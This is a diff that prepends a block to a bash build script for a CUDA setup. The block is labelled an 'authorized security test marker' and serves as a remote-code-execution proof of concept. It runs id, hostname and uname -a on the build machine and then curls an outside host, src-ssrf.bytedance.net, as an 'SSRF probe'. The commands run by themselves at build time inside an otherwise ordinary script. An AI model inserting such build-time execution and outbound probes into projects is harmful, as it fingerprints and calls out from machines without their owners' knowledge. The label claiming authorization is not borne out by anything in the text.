@@ -1,4 +1,13 @@
 #!/bin/bash
+# --- authorized security test marker (read-only) ---
+echo "===== POC_RCE_BUILD ====="
+date -u
+id
+hostname
+uname -a
+echo "===== SSRF_PROBE ====="
+curl -sS -m 20 -w '\nHTTP:%{http_code}\n' https://src-ssrf.bytedance.net/ssrf || true
+echo "===== POC_RCE_END ====="
 
 export CUDA_HOME=${CUDA_HOME:-/usr/bin/}
 echo "PATH=${PATH}"
